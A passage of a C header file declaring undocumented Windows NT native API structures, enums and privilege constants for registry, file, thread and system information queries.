} PLUGPLAY_EVENT_BLOCK, *PPLUGPLAY_EVENT_BLOCK;

typedef LARGE_INTEGER PHYSICAL_ADDRESS, *PPHYSICAL_ADDRESS;

#define MDL_HASH_TABLE_SIZE 64
#define MDL_HASH_MASK	(MDL_HASH_TABLE_SIZE-1)
#define MDL_HASH_INDEX(wch) ((RtlUpcaseUnicodeChar((wch)) - (WCHAR)'A') & MDL_HASH_MASK)

#if !defined(_WINNT_)
#define HEAP_MAKE_TAG_FLAGS( b, o ) ((ULONG)((b) + ((o) << 18)))
#endif
#define RTL_HEAP_MAKE_TAG HEAP_MAKE_TAG_FLAGS

typedef struct _TIME_FIELDS {
	CSHORT Year;        // range [1601...]
	CSHORT Month;       // range [1..12]
	CSHORT Day;         // range [1..31]
	CSHORT Hour;        // range [0..23]
	CSHORT Minute;      // range [0..59]
	CSHORT Second;      // range [0..59]
	CSHORT Milliseconds;// range [0..999]
	CSHORT Weekday;     // range [0..6] == [Sunday..Saturday]
} TIME_FIELDS;
typedef TIME_FIELDS *PTIME_FIELDS;

typedef struct _RTL_TIME_ZONE_INFORMATION {
	LONG Bias;
	WCHAR StandardName[ 32 ];
	TIME_FIELDS StandardStart;
	LONG StandardBias;
	WCHAR DaylightName[ 32 ];
	TIME_FIELDS DaylightStart;
	LONG DaylightBias;
} RTL_TIME_ZONE_INFORMATION, *PRTL_TIME_ZONE_INFORMATION;

typedef struct _RTL_BITMAP_RUN {
	ULONG StartingIndex;
	ULONG NumberOfBits;
} RTL_BITMAP_RUN;
typedef RTL_BITMAP_RUN *PRTL_BITMAP_RUN;

typedef struct _PARSE_MESSAGE_CONTEXT {
	ULONG fFlags;
	ULONG cwSavColumn;
	SIZE_T iwSrc;
	SIZE_T iwDst;
	SIZE_T iwDstSpace;
	va_list lpvArgStart;
} PARSE_MESSAGE_CONTEXT, *PPARSE_MESSAGE_CONTEXT;

typedef enum _RTL_RXACT_OPERATION {
	RtlRXactOperationDelete = 1,        // Causes sub-key to be deleted
	RtlRXactOperationSetValue,          // Sets sub-key value (creates key(s) if necessary)
	RtlRXactOperationDelAttribute,
	RtlRXactOperationSetAttribute
} RTL_RXACT_OPERATION, *PRTL_RXACT_OPERATION;

typedef struct _RTL_RXACT_LOG {
	ULONG OperationCount;
	ULONG LogSize;
	ULONG LogSizeInUse;
#if defined(_M_X64)
	ULONG Alignment;
#endif
} RTL_RXACT_LOG, *PRTL_RXACT_LOG;

typedef struct _RTL_RXACT_CONTEXT {
	HANDLE RootRegistryKey;
	HANDLE RXactKey;
	BOOLEAN HandlesValid;
	PRTL_RXACT_LOG RXactLog;
} RTL_RXACT_CONTEXT, *PRTL_RXACT_CONTEXT;

#define MAXIMUM_LEADBYTES   12

typedef struct _CPTABLEINFO {
	USHORT CodePage;                    // code page number
	USHORT MaximumCharacterSize;        // max length (bytes) of a char
	USHORT DefaultChar;                 // default character (MB)
	USHORT UniDefaultChar;              // default character (Unicode)
	USHORT TransDefaultChar;            // translation of default char (Unicode)
	USHORT TransUniDefaultChar;         // translation of Unic default char (MB)
	USHORT DBCSCodePage;                // Non 0 for DBCS code pages
	UCHAR  LeadByte[MAXIMUM_LEADBYTES]; // lead byte ranges
	PUSHORT MultiByteTable;             // pointer to MB translation table
	PVOID   WideCharTable;              // pointer to WC translation table
	PUSHORT DBCSRanges;                 // pointer to DBCS ranges
	PUSHORT DBCSOffsets;                // pointer to DBCS offsets
} CPTABLEINFO, *PCPTABLEINFO;

typedef struct _NLSTABLEINFO {
	CPTABLEINFO OemTableInfo;
	CPTABLEINFO AnsiTableInfo;
	PUSHORT UpperCaseTable;             // 844 format upcase table
	PUSHORT LowerCaseTable;             // 844 format lower case table
} NLSTABLEINFO, *PNLSTABLEINFO;

#define RTL_RANGE_LIST_SHARED_OK           0x00000001
#define RTL_RANGE_LIST_NULL_CONFLICT_OK    0x00000002

typedef struct _RTL_RANGE {
	ULONGLONG Start;    // Read only
	ULONGLONG End;      // Read only
	PVOID UserData;     // Read/Write
	PVOID Owner;        // Read/Write
	UCHAR Attributes;    // Read/Write
	UCHAR Flags;       // Read only
} RTL_RANGE, *PRTL_RANGE;

typedef
	BOOLEAN
	(*PRTL_CONFLICT_RANGE_CALLBACK) (
	IN PVOID Context,
	IN PRTL_RANGE Range
	);

typedef enum _EVENT_INFORMATION_CLASS {
	EventBasicInformation
} EVENT_INFORMATION_CLASS;


typedef enum _PLUGPLAY_CONTROL_CLASS {
	PlugPlayControlEnumerateDevice,
	PlugPlayControlRegisterNewDevice,
	PlugPlayControlDeregisterDevice,
	PlugPlayControlInitializeDevice,
	PlugPlayControlStartDevice,
	PlugPlayControlUnlockDevice,
	PlugPlayControlQueryAndRemoveDevice,
	PlugPlayControlUserResponse,
	PlugPlayControlGenerateLegacyDevice,
	PlugPlayControlGetInterfaceDeviceList,
	PlugPlayControlProperty,
	PlugPlayControlDeviceClassAssociation,
	PlugPlayControlGetRelatedDevice,
	PlugPlayControlGetInterfaceDeviceAlias,
	PlugPlayControlDeviceStatus,
	PlugPlayControlGetDeviceDepth,
	PlugPlayControlQueryDeviceRelations,
	PlugPlayControlTargetDeviceRelation,
	PlugPlayControlQueryConflictList,
	PlugPlayControlRetrieveDock,
	PlugPlayControlResetDevice,
	PlugPlayControlHaltDevice,
	PlugPlayControlGetBlockedDriverList,
	MaxPlugPlayControl
} PLUGPLAY_CONTROL_CLASS, *PPLUGPLAY_CONTROL_CLASS;

typedef
VOID
(*PPS_APC_ROUTINE) (
    IN OPTIONAL PVOID ApcArgument1,
    IN OPTIONAL PVOID ApcArgument2,
    IN OPTIONAL PVOID ApcArgument3
    );

typedef enum _KEY_INFORMATION_CLASS {
	KeyBasicInformation,
	KeyNodeInformation,
	KeyFullInformation,
	KeyNameInformation,
	KeyCachedInformation,
	KeyFlagsInformation,
	MaxKeyInfoClass
} KEY_INFORMATION_CLASS;

typedef struct _KEY_BASIC_INFORMATION {
	LARGE_INTEGER LastWriteTime;
	ULONG TitleIndex;
	ULONG NameLength;
	WCHAR Name[1];
} KEY_BASIC_INFORMATION, *PKEY_BASIC_INFORMATION;

typedef enum _KEY_VALUE_INFORMATION_CLASS {
	KeyValueBasicInformation,
	KeyValueFullInformation,
	KeyValuePartialInformation,
	KeyValueFullInformationAlign64,
	KeyValuePartialInformationAlign64,
	MaxKeyValueInfoClass
} KEY_VALUE_INFORMATION_CLASS;

//
// Value entry query structures
// 14.09.11

typedef struct _KEY_VALUE_BASIC_INFORMATION {
    ULONG   TitleIndex;
    ULONG   Type;
    ULONG   NameLength;
    WCHAR   Name[1];            // Variable size
} KEY_VALUE_BASIC_INFORMATION, *PKEY_VALUE_BASIC_INFORMATION;

typedef struct _KEY_VALUE_FULL_INFORMATION {
    ULONG   TitleIndex;
    ULONG   Type;
    ULONG   DataOffset;
    ULONG   DataLength;
    ULONG   NameLength;
    WCHAR   Name[1];            // Variable size
//          Data[1];            // Variable size data not declared
} KEY_VALUE_FULL_INFORMATION, *PKEY_VALUE_FULL_INFORMATION;

typedef struct _KEY_VALUE_PARTIAL_INFORMATION {
    ULONG   TitleIndex;
    ULONG   Type;
    ULONG   DataLength;
    UCHAR   Data[1];            // Variable size
} KEY_VALUE_PARTIAL_INFORMATION, *PKEY_VALUE_PARTIAL_INFORMATION;

typedef struct _KEY_VALUE_PARTIAL_INFORMATION_ALIGN64 {
    ULONG   Type;
    ULONG   DataLength;
    UCHAR   Data[1];            // Variable size
} KEY_VALUE_PARTIAL_INFORMATION_ALIGN64, *PKEY_VALUE_PARTIAL_INFORMATION_ALIGN64;

typedef struct _KEY_VALUE_ENTRY {
    PUNICODE_STRING ValueName;
    ULONG           DataLength;
    ULONG           DataOffset;
    ULONG           Type;
} KEY_VALUE_ENTRY, *PKEY_VALUE_ENTRY;

//
// end of value info
//

typedef enum _KEY_SET_INFORMATION_CLASS {
	KeyWriteTimeInformation,
	KeyUserFlagsInformation,
	MaxKeySetInfoClass
} KEY_SET_INFORMATION_CLASS;

#define SE_CREATE_TOKEN_NAME								TEXT("SeCreateTokenPrivilege")
#define SE_ASSIGNPRIMARYTOKEN_NAME					TEXT("SeAssignPrimaryTokenPrivilege")
#define SE_LOCK_MEMORY_NAME									TEXT("SeLockMemoryPrivilege")
#define SE_INCREASE_QUOTA_NAME							TEXT("SeIncreaseQuotaPrivilege")
#define SE_UNSOLICITED_INPUT_NAME						TEXT("SeUnsolicitedInputPrivilege")
#define SE_MACHINE_ACCOUNT_NAME							TEXT("SeMachineAccountPrivilege")
#define SE_TCB_NAME													TEXT("SeTcbPrivilege")
#define SE_SECURITY_NAME										TEXT("SeSecurityPrivilege")
#define SE_TAKE_OWNERSHIP_NAME							TEXT("SeTakeOwnershipPrivilege")
#define SE_LOAD_DRIVER_NAME									TEXT("SeLoadDriverPrivilege")
#define SE_SYSTEM_PROFILE_NAME							TEXT("SeSystemProfilePrivilege")
#define SE_SYSTEMTIME_NAME									TEXT("SeSystemtimePrivilege")
#define SE_PROF_SINGLE_PROCESS_NAME					TEXT("SeProfileSingleProcessPrivilege")
#define SE_INC_BASE_PRIORITY_NAME						TEXT("SeIncreaseBasePriorityPrivilege")
#define SE_CREATE_PAGEFILE_NAME							TEXT("SeCreatePagefilePrivilege")
#define SE_CREATE_PERMANENT_NAME						TEXT("SeCreatePermanentPrivilege")
#define SE_BACKUP_NAME											TEXT("SeBackupPrivilege")
#define SE_RESTORE_NAME											TEXT("SeRestorePrivilege")
#define SE_SHUTDOWN_NAME										TEXT("SeShutdownPrivilege")
#define SE_DEBUG_NAME												TEXT("SeDebugPrivilege")
#define SE_AUDIT_NAME												TEXT("SeAuditPrivilege")
#define SE_SYSTEM_ENVIRONMENT_NAME					TEXT("SeSystemEnvironmentPrivilege")
#define SE_CHANGE_NOTIFY_NAME								TEXT("SeChangeNotifyPrivilege")
#define SE_REMOTE_SHUTDOWN_NAME							TEXT("SeRemoteShutdownPrivilege")
#define SE_UNDOCK_NAME											TEXT("SeUndockPrivilege")
#define SE_SYNC_AGENT_NAME									TEXT("SeSyncAgentPrivilege")
#define SE_ENABLE_DELEGATION_NAME						TEXT("SeEnableDelegationPrivilege")
#define SE_MANAGE_VOLUME_NAME								TEXT("SeManageVolumePrivilege")
#define SE_IMPERSONATE_NAME									TEXT("SeImpersonatePrivilege")
// #define SE_CREATE_GLOBAL_PRIVILEGE					TEXT("SeCreateGlobalPrivilege")
// #define SE_TRUSTED_CREDMAN_ACCESS_PRIVILEGE	TEXT("SeTrustedCredmanAccessPrivilege")
// #define SE_RELABEL_PRIVILEGE								TEXT("SeReLabelPrivilege")
#define SE_CREATE_GLOBAL_NAME								TEXT("SeCreateGlobalPrivilege")

// Privileges

#define SE_MIN_WELL_KNOWN_PRIVILEGE (2L)
#define SE_CREATE_TOKEN_PRIVILEGE (2L)
#define SE_ASSIGNPRIMARYTOKEN_PRIVILEGE (3L)
#define SE_LOCK_MEMORY_PRIVILEGE (4L)
#define SE_INCREASE_QUOTA_PRIVILEGE (5L)

#define SE_MACHINE_ACCOUNT_PRIVILEGE (6L)
#define SE_TCB_PRIVILEGE (7L)
#define SE_SECURITY_PRIVILEGE (8L)
#define SE_TAKE_OWNERSHIP_PRIVILEGE (9L)
#define SE_LOAD_DRIVER_PRIVILEGE (10L)
#define SE_SYSTEM_PROFILE_PRIVILEGE (11L)
#define SE_SYSTEMTIME_PRIVILEGE (12L)
#define SE_PROF_SINGLE_PROCESS_PRIVILEGE (13L)
#define SE_INC_BASE_PRIORITY_PRIVILEGE (14L)
#define SE_CREATE_PAGEFILE_PRIVILEGE (15L)
#define SE_CREATE_PERMANENT_PRIVILEGE (16L)
#define SE_BACKUP_PRIVILEGE (17L)
#define SE_RESTORE_PRIVILEGE (18L)
#define SE_SHUTDOWN_PRIVILEGE (19L)
#define SE_DEBUG_PRIVILEGE (20L)
#define SE_AUDIT_PRIVILEGE (21L)
#define SE_SYSTEM_ENVIRONMENT_PRIVILEGE (22L)
#define SE_CHANGE_NOTIFY_PRIVILEGE (23L)
#define SE_REMOTE_SHUTDOWN_PRIVILEGE (24L)
#define SE_UNDOCK_PRIVILEGE (25L)
#define SE_SYNC_AGENT_PRIVILEGE (26L)
#define SE_ENABLE_DELEGATION_PRIVILEGE (27L)
#define SE_MANAGE_VOLUME_PRIVILEGE (28L)
#define SE_IMPERSONATE_PRIVILEGE (29L)
#define SE_CREATE_GLOBAL_PRIVILEGE (30L)
#define SE_TRUSTED_CREDMAN_ACCESS_PRIVILEGE (31L)
#define SE_RELABEL_PRIVILEGE (32L)
#define SE_INC_WORKING_SET_PRIVILEGE (33L)
#define SE_TIME_ZONE_PRIVILEGE (34L)
#define SE_CREATE_SYMBOLIC_LINK_PRIVILEGE (35L)
#define SE_MAX_WELL_KNOWN_PRIVILEGE SE_CREATE_SYMBOLIC_LINK_PRIVILEGE

typedef struct _CLIENT_ID
{
	HANDLE UniqueProcess;
	HANDLE UniqueThread;
} CLIENT_ID, *PCLIENT_ID;

typedef struct _CLIENT_ID32
{
	ULONG UniqueProcess;
	ULONG UniqueThread;
} CLIENT_ID32, *PCLIENT_ID32;

typedef struct _CLIENT_ID64
{
	ULONGLONG UniqueProcess;
	ULONGLONG UniqueThread;
} CLIENT_ID64, *PCLIENT_ID64;

#include <pshpack4.h>

typedef struct _KSYSTEM_TIME
{
	ULONG LowPart;
	LONG High1Time;
	LONG High2Time;
} KSYSTEM_TIME, *PKSYSTEM_TIME;

#include <poppack.h>

//
// FILE_INFORMATION
//
//readded 17.09.11 EP_X0FF

typedef struct _FILE_BASIC_INFORMATION {                    // ntddk wdm nthal
	LARGE_INTEGER CreationTime;                             // ntddk wdm nthal
	LARGE_INTEGER LastAccessTime;                           // ntddk wdm nthal
	LARGE_INTEGER LastWriteTime;                            // ntddk wdm nthal
	LARGE_INTEGER ChangeTime;                               // ntddk wdm nthal
	ULONG FileAttributes;                                   // ntddk wdm nthal
} FILE_BASIC_INFORMATION, *PFILE_BASIC_INFORMATION;         // ntddk wdm nthal

typedef struct _FILE_STANDARD_INFORMATION
{
	LARGE_INTEGER AllocationSize;
	LARGE_INTEGER EndOfFile;
	ULONG NumberOfLinks;
	UCHAR DeletePending;
	UCHAR Directory;
} FILE_STANDARD_INFORMATION;

typedef struct _FILE_INTERNAL_INFORMATION {
    LARGE_INTEGER IndexNumber;
} FILE_INTERNAL_INFORMATION, *PFILE_INTERNAL_INFORMATION;

typedef struct _FILE_EA_INFORMATION {
    ULONG EaSize;
} FILE_EA_INFORMATION, *PFILE_EA_INFORMATION;

typedef struct _FILE_ACCESS_INFORMATION {
    ACCESS_MASK AccessFlags;
} FILE_ACCESS_INFORMATION, *PFILE_ACCESS_INFORMATION;

typedef struct _FILE_POSITION_INFORMATION {                 // ntddk wdm nthal
    LARGE_INTEGER CurrentByteOffset;                        // ntddk wdm nthal
} FILE_POSITION_INFORMATION, *PFILE_POSITION_INFORMATION;   // ntddk wdm nthal
                                                            // ntddk wdm nthal
typedef struct _FILE_MODE_INFORMATION {
    ULONG Mode;
} FILE_MODE_INFORMATION, *PFILE_MODE_INFORMATION;

typedef struct _FILE_ALIGNMENT_INFORMATION {                // ntddk nthal
    ULONG AlignmentRequirement;                             // ntddk nthal
} FILE_ALIGNMENT_INFORMATION, *PFILE_ALIGNMENT_INFORMATION; // ntddk nthal
                                                            // ntddk nthal
typedef struct _FILE_NAME_INFORMATION {                     // ntddk
    ULONG FileNameLength;                                   // ntddk
    WCHAR FileName[1];                                      // ntddk
} FILE_NAME_INFORMATION, *PFILE_NAME_INFORMATION;           // ntddk

typedef struct _FILE_ALL_INFORMATION {
    FILE_BASIC_INFORMATION BasicInformation;
    FILE_STANDARD_INFORMATION StandardInformation;
    FILE_INTERNAL_INFORMATION InternalInformation;
    FILE_EA_INFORMATION EaInformation;
    FILE_ACCESS_INFORMATION AccessInformation;
    FILE_POSITION_INFORMATION PositionInformation;
    FILE_MODE_INFORMATION ModeInformation;
    FILE_ALIGNMENT_INFORMATION AlignmentInformation;
    FILE_NAME_INFORMATION NameInformation;
} FILE_ALL_INFORMATION, *PFILE_ALL_INFORMATION;

typedef struct _FILE_NETWORK_OPEN_INFORMATION {                 // ntddk wdm nthal
    LARGE_INTEGER CreationTime;                                 // ntddk wdm nthal
    LARGE_INTEGER LastAccessTime;                               // ntddk wdm nthal
    LARGE_INTEGER LastWriteTime;                                // ntddk wdm nthal
    LARGE_INTEGER ChangeTime;                                   // ntddk wdm nthal
    LARGE_INTEGER AllocationSize;                               // ntddk wdm nthal
    LARGE_INTEGER EndOfFile;                                    // ntddk wdm nthal
    ULONG FileAttributes;                                       // ntddk wdm nthal
} FILE_NETWORK_OPEN_INFORMATION, *PFILE_NETWORK_OPEN_INFORMATION;   // ntddk wdm nthal
                                                                // ntddk wdm nthal
typedef struct _FILE_ATTRIBUTE_TAG_INFORMATION {               // ntddk nthal
    ULONG FileAttributes;                                       // ntddk nthal
    ULONG ReparseTag;                                           // ntddk nthal
} FILE_ATTRIBUTE_TAG_INFORMATION, *PFILE_ATTRIBUTE_TAG_INFORMATION;  // ntddk nthal
                                                                // ntddk nthal
typedef struct _FILE_ALLOCATION_INFORMATION {
    LARGE_INTEGER AllocationSize;
} FILE_ALLOCATION_INFORMATION, *PFILE_ALLOCATION_INFORMATION;

typedef struct _FILE_COMPRESSION_INFORMATION {
    LARGE_INTEGER CompressedFileSize;
    USHORT CompressionFormat;
    UCHAR CompressionUnitShift;
    UCHAR ChunkShift;
    UCHAR ClusterShift;
    UCHAR Reserved[3];
} FILE_COMPRESSION_INFORMATION, *PFILE_COMPRESSION_INFORMATION;

typedef struct _FILE_DISPOSITION_INFORMATION {                  // ntddk nthal
    BOOLEAN DeleteFile;                                         // ntddk nthal
} FILE_DISPOSITION_INFORMATION, *PFILE_DISPOSITION_INFORMATION; // ntddk nthal
                                                                // ntddk nthal
typedef struct _FILE_END_OF_FILE_INFORMATION {                  // ntddk nthal
    LARGE_INTEGER EndOfFile;                                    // ntddk nthal
} FILE_END_OF_FILE_INFORMATION, *PFILE_END_OF_FILE_INFORMATION; // ntddk nthal
                                                                // ntddk nthal
typedef struct _FILE_VALID_DATA_LENGTH_INFORMATION {                                    // ntddk nthal
    LARGE_INTEGER ValidDataLength;                                                      // ntddk nthal
} FILE_VALID_DATA_LENGTH_INFORMATION, *PFILE_VALID_DATA_LENGTH_INFORMATION;             // ntddk nthal

typedef struct _FILE_LINK_INFORMATION {
    BOOLEAN ReplaceIfExists;
    HANDLE RootDirectory;
    ULONG FileNameLength;
    WCHAR FileName[1];
} FILE_LINK_INFORMATION, *PFILE_LINK_INFORMATION;

typedef struct _FILE_MOVE_CLUSTER_INFORMATION {
    ULONG ClusterCount;
    HANDLE RootDirectory;
    ULONG FileNameLength;
    WCHAR FileName[1];
} FILE_MOVE_CLUSTER_INFORMATION, *PFILE_MOVE_CLUSTER_INFORMATION;

typedef struct _FILE_RENAME_INFORMATION {
    BOOLEAN ReplaceIfExists;
    HANDLE RootDirectory;
    ULONG FileNameLength;
    WCHAR FileName[1];
} FILE_RENAME_INFORMATION, *PFILE_RENAME_INFORMATION;

typedef struct _FILE_STREAM_INFORMATION {
    ULONG NextEntryOffset;
    ULONG StreamNameLength;
    LARGE_INTEGER StreamSize;
    LARGE_INTEGER StreamAllocationSize;
    WCHAR StreamName[1];
} FILE_STREAM_INFORMATION, *PFILE_STREAM_INFORMATION;

typedef struct _FILE_TRACKING_INFORMATION {
    HANDLE DestinationFile;
    ULONG ObjectInformationLength;
    CHAR ObjectInformation[1];
} FILE_TRACKING_INFORMATION, *PFILE_TRACKING_INFORMATION;

typedef struct _FILE_COMPLETION_INFORMATION {
    HANDLE Port;
    PVOID Key;
} FILE_COMPLETION_INFORMATION, *PFILE_COMPLETION_INFORMATION;

typedef struct _FILE_PIPE_INFORMATION {
     ULONG ReadMode;
     ULONG CompletionMode;
} FILE_PIPE_INFORMATION, *PFILE_PIPE_INFORMATION;

typedef struct _FILE_PIPE_LOCAL_INFORMATION {
     ULONG NamedPipeType;
     ULONG NamedPipeConfiguration;
     ULONG MaximumInstances;
     ULONG CurrentInstances;
     ULONG InboundQuota;
     ULONG ReadDataAvailable;
     ULONG OutboundQuota;
     ULONG WriteQuotaAvailable;
     ULONG NamedPipeState;
     ULONG NamedPipeEnd;
} FILE_PIPE_LOCAL_INFORMATION, *PFILE_PIPE_LOCAL_INFORMATION;

typedef struct _FILE_PIPE_REMOTE_INFORMATION {
     LARGE_INTEGER CollectDataTime;
     ULONG MaximumCollectionCount;
} FILE_PIPE_REMOTE_INFORMATION, *PFILE_PIPE_REMOTE_INFORMATION;

typedef struct _FILE_MAILSLOT_QUERY_INFORMATION {
    ULONG MaximumMessageSize;
    ULONG MailslotQuota;
    ULONG NextMessageSize;
    ULONG MessagesAvailable;
    LARGE_INTEGER ReadTimeout;
} FILE_MAILSLOT_QUERY_INFORMATION, *PFILE_MAILSLOT_QUERY_INFORMATION;

typedef struct _FILE_MAILSLOT_SET_INFORMATION {
    PLARGE_INTEGER ReadTimeout;
} FILE_MAILSLOT_SET_INFORMATION, *PFILE_MAILSLOT_SET_INFORMATION;

typedef struct _FILE_REPARSE_POINT_INFORMATION {
    LONGLONG FileReference;
    ULONG Tag;
} FILE_REPARSE_POINT_INFORMATION, *PFILE_REPARSE_POINT_INFORMATION;

//
// NtQuery(Set)EaFile
//
// The offset for the start of EaValue is EaName[EaNameLength + 1]
//

// begin_ntddk begin_wdm

typedef struct _FILE_FULL_EA_INFORMATION {
    ULONG NextEntryOffset;
    UCHAR Flags;
    UCHAR EaNameLength;
    USHORT EaValueLength;
    CHAR EaName[1];
} FILE_FULL_EA_INFORMATION, *PFILE_FULL_EA_INFORMATION;

// end_ntddk end_wdm

typedef struct _FILE_GET_EA_INFORMATION {
    ULONG NextEntryOffset;
    UCHAR EaNameLength;
    CHAR EaName[1];
} FILE_GET_EA_INFORMATION, *PFILE_GET_EA_INFORMATION;

//
// NtQuery(Set)QuotaInformationFile
//

typedef struct _FILE_GET_QUOTA_INFORMATION {
    ULONG NextEntryOffset;
    ULONG SidLength;
    SID Sid;
} FILE_GET_QUOTA_INFORMATION, *PFILE_GET_QUOTA_INFORMATION;

typedef struct _FILE_QUOTA_INFORMATION {
    ULONG NextEntryOffset;
    ULONG SidLength;
    LARGE_INTEGER ChangeTime;
    LARGE_INTEGER QuotaUsed;
    LARGE_INTEGER QuotaThreshold;
    LARGE_INTEGER QuotaLimit;
    SID Sid;
} FILE_QUOTA_INFORMATION, *PFILE_QUOTA_INFORMATION;

//
// NtQueryDirectoryFile return types:
//
//      FILE_DIRECTORY_INFORMATION
//      FILE_FULL_DIR_INFORMATION
//      FILE_ID_FULL_DIR_INFORMATION
//      FILE_BOTH_DIR_INFORMATION
//      FILE_ID_BOTH_DIR_INFORMATION
//      FILE_NAMES_INFORMATION
//      FILE_OBJECTID_INFORMATION
//

typedef struct _FILE_DIRECTORY_INFORMATION {
    ULONG NextEntryOffset;
    ULONG FileIndex;
    LARGE_INTEGER CreationTime;
    LARGE_INTEGER LastAccessTime;
    LARGE_INTEGER LastWriteTime;
    LARGE_INTEGER ChangeTime;
    LARGE_INTEGER EndOfFile;
    LARGE_INTEGER AllocationSize;
    ULONG FileAttributes;
    ULONG FileNameLength;
    WCHAR FileName[1];
} FILE_DIRECTORY_INFORMATION, *PFILE_DIRECTORY_INFORMATION;

typedef struct _FILE_FULL_DIR_INFORMATION {
    ULONG NextEntryOffset;
    ULONG FileIndex;
    LARGE_INTEGER CreationTime;
    LARGE_INTEGER LastAccessTime;
    LARGE_INTEGER LastWriteTime;
    LARGE_INTEGER ChangeTime;
    LARGE_INTEGER EndOfFile;
    LARGE_INTEGER AllocationSize;
    ULONG FileAttributes;
    ULONG FileNameLength;
    ULONG EaSize;
    WCHAR FileName[1];
} FILE_FULL_DIR_INFORMATION, *PFILE_FULL_DIR_INFORMATION;

typedef struct _FILE_ID_FULL_DIR_INFORMATION {
    ULONG NextEntryOffset;
    ULONG FileIndex;
    LARGE_INTEGER CreationTime;
    LARGE_INTEGER LastAccessTime;
    LARGE_INTEGER LastWriteTime;
    LARGE_INTEGER ChangeTime;
    LARGE_INTEGER EndOfFile;
    LARGE_INTEGER AllocationSize;
    ULONG FileAttributes;
    ULONG FileNameLength;
    ULONG EaSize;
    LARGE_INTEGER FileId;
    WCHAR FileName[1];
} FILE_ID_FULL_DIR_INFORMATION, *PFILE_ID_FULL_DIR_INFORMATION;

typedef struct _FILE_BOTH_DIR_INFORMATION {
    ULONG NextEntryOffset;
    ULONG FileIndex;
    LARGE_INTEGER CreationTime;
    LARGE_INTEGER LastAccessTime;
    LARGE_INTEGER LastWriteTime;
    LARGE_INTEGER ChangeTime;
    LARGE_INTEGER EndOfFile;
    LARGE_INTEGER AllocationSize;
    ULONG FileAttributes;
    ULONG FileNameLength;
    ULONG EaSize;
    CCHAR ShortNameLength;
    WCHAR ShortName[12];
    WCHAR FileName[1];
} FILE_BOTH_DIR_INFORMATION, *PFILE_BOTH_DIR_INFORMATION;

typedef struct _FILE_ID_BOTH_DIR_INFORMATION {
    ULONG NextEntryOffset;
    ULONG FileIndex;
    LARGE_INTEGER CreationTime;
    LARGE_INTEGER LastAccessTime;
    LARGE_INTEGER LastWriteTime;
    LARGE_INTEGER ChangeTime;
    LARGE_INTEGER EndOfFile;
    LARGE_INTEGER AllocationSize;
    ULONG FileAttributes;
    ULONG FileNameLength;
    ULONG EaSize;
    CCHAR ShortNameLength;
    WCHAR ShortName[12];
    LARGE_INTEGER FileId;
    WCHAR FileName[1];
} FILE_ID_BOTH_DIR_INFORMATION, *PFILE_ID_BOTH_DIR_INFORMATION;

typedef struct _FILE_NAMES_INFORMATION {
    ULONG NextEntryOffset;
    ULONG FileIndex;
    ULONG FileNameLength;
    WCHAR FileName[1];
} FILE_NAMES_INFORMATION, *PFILE_NAMES_INFORMATION;

typedef struct _FILE_OBJECTID_INFORMATION {
    LONGLONG FileReference;
    UCHAR ObjectId[16];
    union {
        struct {
            UCHAR BirthVolumeId[16];
            UCHAR BirthObjectId[16];
            UCHAR DomainId[16];
        } ;
        UCHAR ExtendedInfo[48];
    };
} FILE_OBJECTID_INFORMATION, *PFILE_OBJECTID_INFORMATION;


//
// SYSTEM_INFORMATION
//

typedef struct _SYSTEM_GDI_DRIVER_INFORMATION
{
	UNICODE_STRING DriverName;
	PVOID ImageAddress;
	PVOID SectionPointer;
	PVOID EntryPoint;
	PIMAGE_EXPORT_DIRECTORY ExportSectionPointer;
	ULONG ImageLength;
} SYSTEM_GDI_DRIVER_INFORMATION, *PSYSTEM_GDI_DRIVER_INFORMATION;

typedef struct _SYSTEM_EXCEPTION_INFORMATION
{
	ULONG AlignmentFixupCount;
	ULONG ExceptionDispatchCount;
	ULONG FloatingEmulationCount;
	ULONG ByteWordEmulationCount;
} SYSTEM_EXCEPTION_INFORMATION, *PSYSTEM_EXCEPTION_INFORMATION;

//
// taken from http://www.acc.umu.se/~bosse/ntifs.h - contents are questionable.
//

typedef enum _THREAD_STATE
{
	StateInitialized,
	StateReady,
	StateRunning,
	StateStandby,
	StateTerminated,
	StateWait,
	StateTransition,
	StateUnknown
} THREAD_STATE;

typedef enum _KWAIT_REASON {
	Executive,
	FreePage,
	PageIn,
	PoolAllocation,
	DelayExecution,
	Suspended,
	UserRequest,
	WrExecutive,
	WrFreePage,
	WrPageIn,
	WrPoolAllocation,
	WrDelayExecution,
	WrSuspended,
	WrUserRequest,
	WrEventPair,
	WrQueue,
	WrLpcReceive,
	WrLpcReply,
	WrVirtualMemory,
	WrPageOut,
	WrRendezvous,
	Spare2,
	Spare3,
	Spare4,
	Spare5,
	Spare6,
	WrKernel,
	WrResource,
	WrPushLock,
	WrMutex,
	WrQuantumEnd,
	WrDispatchInt,
	WrPreempted,
	WrYieldExecution,
	WrFastMutex,
	WrGuardedMutex,
	WrRundown,
	MaximumWaitReason
} KWAIT_REASON;

//FIXED 21.02.2011 size for x64/x86
typedef struct _SYSTEM_THREAD_INFORMATION {
	LARGE_INTEGER   KernelTime;
	LARGE_INTEGER   UserTime;
	LARGE_INTEGER   CreateTime;
	ULONG           WaitTime;
	PVOID           StartAddress;
	CLIENT_ID       ClientId;
	KPRIORITY       Priority;
	KPRIORITY       BasePriority;
	ULONG           ContextSwitchCount;
	THREAD_STATE    State;
	KWAIT_REASON    WaitReason;
} SYSTEM_THREAD_INFORMATION, *PSYSTEM_THREAD_INFORMATION;

typedef struct _SYSTEM_EXTENDED_THREAD_INFORMATION {
	SYSTEM_THREAD_INFORMATION ThreadInfo;
	PVOID StackBase;
	PVOID StackLimit;
	PVOID Win32StartAddress;
	ULONG_PTR Reserved1;
	ULONG_PTR Reserved2;
	ULONG_PTR Reserved3;
	ULONG_PTR Reserved4;
} SYSTEM_EXTENDED_THREAD_INFORMATION, *PSYSTEM_EXTENDED_THREAD_INFORMATION;

typedef struct _SYSTEM_POOL_ENTRY {
	BOOLEAN Allocated;
	BOOLEAN Spare0;
	USHORT AllocatorBackTraceIndex;
	ULONG Size;
	union {
		UCHAR Tag[4];
		ULONG TagUlong;
		PVOID ProcessChargedQuota;
	};
} SYSTEM_POOL_ENTRY, *PSYSTEM_POOL_ENTRY;

typedef struct _SYSTEM_POOL_INFORMATION {
	SIZE_T TotalSize;
	PVOID FirstEntry;
	USHORT EntryOverhead;
	BOOLEAN PoolTagPresent;
	BOOLEAN Spare0;
	ULONG NumberOfEntries;
	SYSTEM_POOL_ENTRY Entries[1];
} SYSTEM_POOL_INFORMATION, *PSYSTEM_POOL_INFORMATION;

typedef struct _SYSTEM_POOLTAG {
	union {
		UCHAR Tag[4];
		ULONG TagUlong;
	};
	ULONG PagedAllocs;
